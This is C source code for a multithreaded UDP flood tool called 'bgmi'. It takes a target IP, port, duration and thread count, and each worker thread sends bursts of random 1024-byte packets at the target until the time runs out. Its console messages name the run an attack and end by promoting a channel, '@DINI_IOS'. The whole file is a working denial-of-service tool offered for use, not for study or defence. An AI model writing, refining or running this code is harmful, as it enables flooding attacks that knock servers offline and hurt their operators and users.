#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h>
    #include <fcntl.h>
#endif

#define PAYLOAD_SIZE 1024
#define BURST_PACKETS 30

void *attack(void *arg);

void handle_sigint(int sig) {
    printf("\nInterrupt received. Stopping attack...\n");
    exit(0);
}

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

struct thread_data {
    char ip[16];
    int port;
    int time;
    int thread_id;
    int total_threads;
};

void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] = (char)(rand() % 256); // Random byte (0x00 to 0xFF)
    }
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char payload[PAYLOAD_SIZE];
    generate_payload(payload, PAYLOAD_SIZE);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < BURST_PACKETS; i++) {
            if (sendto(sock, payload, PAYLOAD_SIZE, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    signal(SIGINT, handle_sigint);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data *thread_data_array = malloc(threads * sizeof(struct thread_data));

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        strncpy(thread_data_array[i].ip, ip, 16);
        thread_data_array[i].port = port;
        thread_data_array[i].time = time;
        thread_data_array[i].thread_id = i;
        thread_data_array[i].total_threads = threads;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&thread_data_array[i]) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(thread_data_array);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    free(thread_data_array);
    printf("Attack finished. Join @DINI_IOS\n");
    return 0;
}
